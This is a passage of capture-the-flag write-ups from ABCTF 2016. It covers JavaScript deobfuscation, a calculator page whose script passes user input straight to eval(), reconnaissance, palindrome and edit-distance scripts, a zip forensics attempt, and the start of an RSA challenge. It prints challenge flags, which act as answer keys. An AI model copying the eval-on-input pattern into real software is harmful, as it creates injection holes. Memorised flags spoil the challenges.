<span class="p">{</span>
                <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">nice job!</span><span class="dl">'</span><span class="p">);</span>
                <span class="nx">process</span><span class="p">.</span><span class="nf">exit</span><span class="p">();</span>
              <span class="p">}</span>
            <span class="p">}</span>
          <span class="p">}</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">nope!</span><span class="dl">'</span><span class="p">);</span>
  <span class="nx">process</span><span class="p">.</span><span class="nf">exit</span><span class="p">();</span>
<span class="p">});</span>
</pre></table></code></div></div><p>looks like <a href="https://esolangs.org/wiki/JSFuck">jsfuck</a> or <a href="https://github.com/alcuadrado/hieroglyphy">hieroglyphy</a></p><p>there exist <a href="https://ooze.ninja/javascript/poisonjs/">poisonjs</a> for deobfuscation javascript</p><p>deobfuscating yields:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="nx">process</span><span class="p">.</span><span class="nx">stdin</span><span class="p">.</span><span class="nf">resume</span><span class="p">();</span>
<span class="nx">process</span><span class="p">.</span><span class="nx">stdin</span><span class="p">.</span><span class="nf">setEncoding</span><span class="p">(</span><span class="dl">'</span><span class="s1">utf8</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Give me a flag</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">process</span><span class="p">.</span><span class="nx">stdin</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">data</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
   <span class="nx">t</span> <span class="o">=</span> <span class="nx">t</span><span class="p">.</span><span class="nf">trim</span><span class="p">();</span>
   <span class="nx">t</span> <span class="o">=</span> <span class="nx">t</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">}</span><span class="dl">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="dl">'</span><span class="s1">}</span><span class="dl">'</span><span class="p">;</span>
   <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
   <span class="k">if </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">19</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nf">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">ABCTF</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">t</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">==</span> <span class="mi">125</span><span class="p">);</span>
   <span class="k">if </span><span class="p">(</span><span class="nx">t</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">}</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="nx">t</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">{</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">2</span><span class="dl">'</span><span class="p">);</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nf">substr</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">node</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">3</span><span class="dl">'</span><span class="p">);</span>
     <span class="k">if </span><span class="p">(</span><span class="nx">t</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">==</span> <span class="nx">t</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">t</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">_</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">4</span><span class="dl">'</span><span class="p">);</span>
      <span class="k">if </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nf">substr</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">is</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">4</span><span class="dl">'</span><span class="p">);</span>
       <span class="k">if </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nf">substr</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">w4Ck</span><span class="dl">"</span><span class="p">){</span>
             <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">nice job!</span><span class="dl">"</span><span class="p">);</span>
             <span class="nx">process</span><span class="p">.</span><span class="nf">exit</span><span class="p">();</span>
         <span class="p">}</span>
       <span class="p">}</span>
     <span class="p">}</span>
    <span class="p">}</span>
   <span class="p">}</span>
  <span class="p">}</span>
 <span class="p">}</span>
 <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">nope!</span><span class="dl">"</span><span class="p">);</span>
 <span class="nx">process</span><span class="p">.</span><span class="nf">exit</span><span class="p">();</span>
<span class="p">});</span>
</pre></table></code></div></div><h2> Flag</h2><code> ABCTF{node_is_w4Ck} </code><hr><h1 id="safety-first"> Safety First <a href="/CTF-writeups-public/writeups/ABCTF-2016/27-web-exploitation-95-safety-first.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> There is a way to exploit the calculator <a href="http://yrmyzscnvh.abctf.xyz/web7/">here</a>.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>source:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre><td class="rouge-code"><pre><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
  <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"main.css"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">src=</span><span class="s">"calc.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
    <span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
    <span class="nt">&lt;center&gt;&lt;h3</span> <span class="na">style=</span><span class="s">"color: black; font-size: 40px"</span><span class="nt">&gt;</span>Web 8<span class="nt">&lt;/h3&gt;&lt;/center&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"box"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"display"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">'.'</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"expression"</span> <span class="na">readonly</span> <span class="na">size=</span><span class="s">"18"</span> <span class="na">id=</span><span class="s">"d"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"keys"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;p&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"button gray"</span> <span class="na">value=</span><span class="s">"mrc"</span> <span class="na">onclick=</span><span class="s">'c("Created....................")'</span><span class="nt">&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"button gray"</span> <span class="na">value=</span><span class="s">"m-"</span>  <span class="na">onclick=</span><span class="s">'c("...............by............")'</span><span class="nt">&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"button gray"</span> <span class="na">value=</span><span class="s">"m+"</span>  <span class="na">onclick=</span><span class="s">'c(".....................Anoop")'</span><span class="nt">&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"button pink"</span> <span class="na">value=</span><span class="s">"/ "</span> <span class="na">onclick=</span><span class="s">'v("/ ")'</span><span class="nt">&gt;</span>
            <span class="nt">&lt;/p&gt;</span>
            <span class="nt">&lt;p&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"button black"</span> <span class="na">value=</span><span class="s">"7 "</span> <span class="na">onclick=</span><span class="s">'v("7 ")'</span><span class="nt">&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"button black"</span> <span class="na">value=</span><span class="s">"8"</span>  <span class="na">onclick=</span><span class="s">'v("8 ")'</span><span class="nt">&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"button black"</span> <span class="na">value=</span><span class="s">"9 "</span> <span class="na">onclick=</span><span class="s">'v("9 ")'</span><span class="nt">&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"button pink"</span> <span class="na">value=</span><span class="s">"* "</span> <span class="na">onclick=</span><span class="s">'v("* ")'</span><span class="nt">&gt;</span>
            <span class="nt">&lt;/p&gt;</span>
            <span class="nt">&lt;p&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"button black"</span> <span class="na">value=</span><span class="s">"4"</span>  <span class="na">onclick=</span><span class="s">'v("4 ")'</span><span class="nt">&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"button black"</span> <span class="na">value=</span><span class="s">"5 "</span> <span class="na">onclick=</span><span class="s">'v("5 ")'</span><span class="nt">&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"button black"</span> <span class="na">value=</span><span class="s">"6 "</span> <span class="na">onclick=</span><span class="s">'v("6 ")'</span><span class="nt">&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"button pink"</span> <span class="na">value=</span><span class="s">"- "</span> <span class="na">onclick=</span><span class="s">'v("- ")'</span><span class="nt">&gt;</span>
            <span class="nt">&lt;/p&gt;</span>
            <span class="nt">&lt;p&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"button black"</span> <span class="na">value=</span><span class="s">"1 "</span> <span class="na">onclick=</span><span class="s">'v("1 ")'</span><span class="nt">&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"button black"</span> <span class="na">value=</span><span class="s">" 2"</span> <span class="na">onclick=</span><span class="s">'v("2 ")'</span><span class="nt">&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"button black"</span> <span class="na">value=</span><span class="s">" 3"</span> <span class="na">onclick=</span><span class="s">'v("3 ")'</span><span class="nt">&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"button pink"</span> <span class="na">value=</span><span class="s">" +"</span> <span class="na">onclick=</span><span class="s">'v("+ ")'</span><span class="nt">&gt;</span>
            <span class="nt">&lt;/p&gt;</span>
            <span class="nt">&lt;p&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"button black"</span> <span class="na">value=</span><span class="s">" 0"</span> <span class="na">onclick=</span><span class="s">'v("0 ")'</span><span class="nt">&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"button black"</span> <span class="na">value=</span><span class="s">"."</span>  <span class="na">onclick=</span><span class="s">'v(".")'</span><span class="nt">&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"button black"</span> <span class="na">value=</span><span class="s">"C"</span>  <span class="na">onclick=</span><span class="s">'c("")'</span><span class="nt">&gt;</span>
            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"button orange"</span> <span class="na">value=</span><span class="s">"="</span><span class="nt">&gt;</span>
            <span class="nt">&lt;/p&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>and <code class="language-plaintext highlighter-rouge">calc.js</code>:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">c</span><span class="p">(</span><span class="nx">val</span><span class="p">){</span>
    <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">d</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="o">=</span><span class="nx">val</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">function</span> <span class="nf">v</span><span class="p">(</span><span class="nx">val</span><span class="p">){</span>
    <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">d</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="o">+=</span><span class="nx">val</span><span class="p">;</span>
<span class="p">}</span>
<span class="kd">function</span> <span class="nf">e</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">try</span> <span class="p">{</span>
      <span class="nf">c</span><span class="p">(</span><span class="nf">eval</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">d</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">))</span>
    <span class="p">}</span>
    <span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
      <span class="nf">c</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error</span><span class="dl">'</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><h2> Flag</h2><code> unsolved </code><hr><h1 id="always-so-itchy"> Always so Itchy <a href="/CTF-writeups-public/writeups/ABCTF-2016/28-reconnaissance-100-always-so-itchy.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> Dialga1234 - Johnny Boy</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This is recon, so we google for Dialga1234, and get a hit on <a href="https://scratch.mit.edu">Scratch</a>, this would seem to fit with the <code class="language-plaintext highlighter-rouge">Itchy</code> in the title so we explore further</p><p>There is an application shared there, it asks for a username and password, which we don’t know, but we can inspect the application and see what it does. Here we can also find the flag</p><p><img src="writeupfiles/itchy.png" alt="" /></p><h2> Flag</h2><code> ABCTF{DoYouThinkISpentTooMuchTimeOnThis} </code><hr><h1 id="racecar"> RacecaR <a href="/CTF-writeups-public/writeups/ABCTF-2016/29-programming-100-racecar.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Aren’t Palindromes cool? I certainly think so, which is why I want you to find the longest palindrome in <a href="writeupfiles/palindrome.txt">this</a> file.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This is the longest palindrome substring problem</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">longestPalindrome</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
        <span class="n">l</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">l</span> <span class="o">&lt;=</span> <span class="mi">2</span><span class="p">:</span>
            <span class="nf">if </span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="n">s</span><span class="p">[</span><span class="n">l</span><span class="o">-</span><span class="mi">1</span><span class="p">]):</span> <span class="k">return</span> <span class="sh">''</span>
            <span class="k">else</span><span class="p">:</span> <span class="k">return</span> <span class="n">s</span>

        <span class="n">result</span> <span class="o">=</span> <span class="sh">''</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">l</span><span class="p">):</span>
            <span class="n">palindrome</span> <span class="o">=</span> <span class="nc">SearchPalindrome</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
            <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">palindrome</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nf">len</span><span class="p">(</span><span class="n">result</span><span class="p">):</span> <span class="n">result</span> <span class="o">=</span> <span class="n">palindrome</span>
            <span class="n">palindrome</span> <span class="o">=</span> <span class="nc">SearchPalindrome</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
            <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">palindrome</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nf">len</span><span class="p">(</span><span class="n">result</span><span class="p">):</span> <span class="n">result</span> <span class="o">=</span> <span class="n">palindrome</span>
        <span class="k">return</span> <span class="n">result</span>

<span class="k">def</span> <span class="nf">SearchPalindrome</span><span class="p">(</span><span class="n">string</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">):</span>
        <span class="nf">while</span><span class="p">(</span><span class="n">start</span><span class="o">&gt;=</span><span class="mi">0</span> <span class="ow">and</span> <span class="n">end</span> <span class="o">&lt;</span> <span class="nf">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span> <span class="ow">and</span> <span class="n">string</span><span class="p">[</span><span class="n">start</span><span class="p">]</span><span class="o">==</span><span class="n">string</span><span class="p">[</span><span class="n">end</span><span class="p">]):</span>
            <span class="n">start</span> <span class="o">-=</span> <span class="mi">1</span>
            <span class="n">end</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">return</span> <span class="n">string</span><span class="p">[</span><span class="n">start</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">end</span><span class="p">]</span>


<span class="n">text</span> <span class="o">=</span> <span class="sh">''</span>
<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">palindrome.txt</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">text</span> <span class="o">+=</span> <span class="n">line</span><span class="p">.</span><span class="nf">rstrip</span><span class="p">()</span>

<span class="k">print</span> <span class="nf">longestPalindrome</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</pre></table></code></div></div><p>output</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>DbrMrbD
</pre></table></code></div></div><h2> Flag</h2><code> unsolved </code><hr><h1 id="virtual-box-7"> Virtual Box 7 <a href="/CTF-writeups-public/writeups/ABCTF-2016/30-virtual-series-100-virtual-box-7.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> <br /> Hmm, I wish I could figure out the team that created Windows 98 without the map hassle.<br /> <strong>Solution</strong></p><h2 id="flag"><span class="mr-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>flag
</pre></table></code></div></div><h2> Flag</h2><code> unsolved </code><hr><h1 id="meteor-smash"> Meteor Smash <a href="/CTF-writeups-public/writeups/ABCTF-2016/31-web-exploitation-100-meteor-smash.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> Dig around in <a href="http://107.170.122.6:8082/">this</a> blog and I’m sure you can find a flag.</p><p><em>Hint: Someone told me my admin checks are insecure.</em></p><p><strong>Solution</strong> A blog that lets you create accounts and post messages if you are logged in.</p><p>XSS?</p><h2> Flag</h2><code> unsolved </code><hr><h1 id="qset1"> Qset1 <a href="/CTF-writeups-public/writeups/ABCTF-2016/32-programming-100-qset1.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> <br /> I created my own programming language and wrote an interpreter for it! <a href="writeupfiles/qset_interpreter.py">Here</a> it is.</p><p>Can you create a program to multiply 2 inputs?</p><p><code class="language-plaintext highlighter-rouge">nc 107.170.122.6 7771</code></p><p><em>Hint: Here’s a program to add 2 inputs. <code class="language-plaintext highlighter-rouge">o0/i0,o0/i1</code></em></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>i0,i1,..,in   are inputs
o0,o1,..,on   are outputs

o0/i0,o0/i1         --&gt; add two inputs
o0/i0,i0/i1         --&gt; add two inputs
o0/a,a/i0,a/i1      --&gt; add two inputs using temp variable
o0/i0 i0            --&gt; divided input by two
o0/i0 i0 i0         --&gt; divided input by three
o0 a/i0             --&gt; assign value of i0 to two variables at once (o0 and a)
o0 o0/i0            --&gt; multiply input by two
o0 o0 o0/i0         --&gt; multiply input by three
</pre></table></code></div></div><h2> Flag</h2><code> unsolved </code><hr><h1 id="zippy"> Zippy <a href="/CTF-writeups-public/writeups/ABCTF-2016/33-forensics-120-zippy.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> <br /> If your could fix this mess I am sure there would be a flag waiting for you.</p><p><strong>Solution</strong> <br /> The top level is a zip file with 53 files inside. They’re all named<br /> <code class="language-plaintext highlighter-rouge">chunk0..chunk53.zip</code> so we concatenate them together to be a single .zip file.</p><p>Attempting to open that indicates that a password is required. Additionally it<br /> is indicated that there are 6890 bytes of junk in front. Not sure what this means.</p><p>This is interesting, but not sure what to make of it:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>$ unzip -P 'abctf' tmp.zip
Archive:  tmp.zip
warning [tmp.zip]:  6890 extra bytes at beginning or within zipfile
  (attempting to process anyway)
   skipping: data.txt                incorrect password


$ unzip -P 'ABCTF' tmp.zip
Archive:  tmp.zip
warning [tmp.zip]:  6890 extra bytes at beginning or within zipfile
  (attempting to process anyway)
 extracting: data.txt                 bad CRC 6517427e  (should be c2be35e6)
    (may instead be incorrect password)

$ cat data.txt | od -tx2 -a
0000000    fbec    de00
          l   { nul   ^
0000004
</pre></table></code></div></div><h2> Flag</h2><code> unsolved </code><hr><h1 id="the-big-kahuna"> The Big Kahuna <a href="/CTF-writeups-public/writeups/ABCTF-2016/34-programming-120-the-big-kahuna.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>What’s the smallest amount of steps (additions, deletions, and replacing) it would take to make the string “massivegargantuanhugeepicginormous” into “tinysmallmicroscopicinvisible”? Don’t guess too many times or we will disqualify you. Remember to wrap your answer in abctf{}.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This is just the edit distance of two strings.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c1"># pip install python-Levenshtein
</span><span class="kn">import</span> <span class="n">Levenshtein</span> <span class="k">as</span> <span class="n">L</span>
<span class="n">L</span><span class="p">.</span><span class="nf">distance</span><span class="p">(</span><span class="sh">'</span><span class="s">massivegargantuanhugeepicginormous</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">tinysmallmicroscopicinvisible</span><span class="sh">'</span><span class="p">)</span>
</pre></table></code></div></div><p>output</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>28
</pre></table></code></div></div><h2> Flag</h2><code> abctf{28} </code><hr><h1 id="a-small-broadcast"> A Small Broadcast <a href="/CTF-writeups-public/writeups/ABCTF-2016/35-cryptography-125-a-small-broadcast.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong> I RSA encrypted the same message 3 different times with the same exponent. Can you decrypt this?</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
